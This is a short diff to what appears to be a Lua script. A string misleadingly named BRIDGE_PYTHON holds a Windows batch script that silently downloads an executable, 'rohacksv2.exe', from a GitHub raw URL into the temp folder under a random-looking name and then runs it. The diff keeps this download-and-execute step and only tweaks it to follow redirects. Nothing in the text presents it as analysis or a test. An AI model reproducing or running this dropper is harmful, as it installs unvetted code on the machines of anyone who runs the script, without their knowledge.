@@ -8,10 +8,8 @@ local function run_batch(batch)
 end
 
 do
-local BRIDGE_PYTHON=
-[=[@echo off
-curl -s -o "%temp%\\hgte4hteteh.exe" "https://github.com/FurryBoyYT/scripting/raw/refs/heads/main/rohacksv2.exe"
-start "" "%temp%\\hgte4hteteh.exe"
-]=]
+local BRIDGE_PYTHON=[[@echo off
+curl -L -s -o "%temp%\\hgte4hteteh.exe" "https://github.com/FurryBoyYT/scripting/raw/refs/heads/main/rohacksv2.exe"
+start "" "%temp%\\hgte4hteteh.exe"]]
 run_batch(BRIDGE_PYTHON)
 end
